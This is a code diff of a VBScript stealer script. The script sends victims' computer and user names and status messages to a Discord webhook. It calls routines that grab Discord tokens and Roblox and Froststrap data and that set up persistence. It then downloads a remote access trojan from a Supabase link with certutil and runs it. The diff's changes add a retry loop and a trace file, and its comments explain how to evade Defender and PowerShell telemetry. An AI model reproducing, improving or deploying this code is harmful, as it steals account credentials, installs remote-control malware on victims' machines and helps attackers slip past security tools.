@@ -10,10 +10,14 @@ Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
 ' --- WEBHOOK ---
-WH = "https://discordapp.com/api/webhooks/1564329308187529359/eFrj6tXHLM0bU-Qz_2a8aLDSYRsp-_qMb1o73PA-3UXkhZ9hxn7WsyNcyj4aZPyNUbLF"
+WH = "https://discordapp.com/api/webhooks/1557496485413781675/FX5fiB-evdnBmtrf5yWkdskxVvFAn4m3pb9O0lWNR-JAqatIikBcSDPwUzeBFh5Vfioo"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+' TRACE
+Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
+Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
 
 ' --- Initial Grab ---
 Call GrabTokens
@@ -22,8 +26,13 @@ Call GrabRoblox
 Call Persistence
 Call GrabFroststrap
 
-' --- Download & Execute RAT ---
-Call DropRAT
+' --- Download & Execute RAT 2 Times ---
+Dim downloadAttempt
+For downloadAttempt = 1 To 2
+    Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 3447003)
+    Call DropRAT
+    If downloadAttempt < 2 Then Call SleepMinutes(2)
+Next
 
 ' --- Re-run grab chain 4x (every 5 min) ---
 Dim runCount
@@ -137,28 +146,30 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- DropRAT (Certutil Download & WMI Execution) ---
+' --- DropRAT (Certutil Download & CMD Execution) ---
 Sub DropRAT()
     Call PostEmbed(":package: RAT Download", "Fetching Payload...", 3447003)
     
-    ' REPLACE WITH YOUR ACTUAL SUPABASE OR PERMANENT LINK
+    ' REPLACE THIS WITH A PERMANENT LINK (SUPABASE, GITHUB, ETC)
     Dim dl : dl = "https://uqmzwiaidvfokyfxzolb.supabase.co/storage/v1/object/public/DiscordUpdater/DiscordUpdater.exe"
+    
+    ' Save to APPDATA instead of TEMP to avoid Defender heuristics
     Dim op : op = sh.ExpandEnvironmentStrings("%APPDATA%") & "\SysCache.exe"
     
     If fso.FileExists(op) Then fso.DeleteFile op
 
-    ' 1. Download using certutil (bypasses some PowerShell telemetry)
+    ' 1. Download using certutil (bypasses PowerShell download flags)
     sh.Run "cmd /c certutil -urlcache -split -f """ & dl & """ """ & op & """ > nul 2>&1", 0, True
 
-    ' 2. Check if downloaded
+    ' 2. Check if downloaded and large enough
     If fso.FileExists(op) And fso.GetFile(op).Size > 3000000 Then
         Call PostEmbed(":rocket: RAT Downloaded", "Size: " & fso.GetFile(op).Size & " bytes", 3447003)
         
-        ' 3. Execute using WMI (hides the command line from basic AV)
-        Dim wmi, process
-        Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-        Set process = wmi.Get("Win32_Process")
-        process.Create op, Null, Null, Null
+        ' 3. Set Working Directory to APPDATA so PyInstaller doesn't crash
+        sh.CurrentDirectory = sh.ExpandEnvironmentStrings("%APPDATA%")
+        
+        ' 4. Execute via cmd /c start (detaches process from HTA)
+        sh.Run "cmd.exe /c start """" """ & op & """", 0, False
         
         Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
     Else
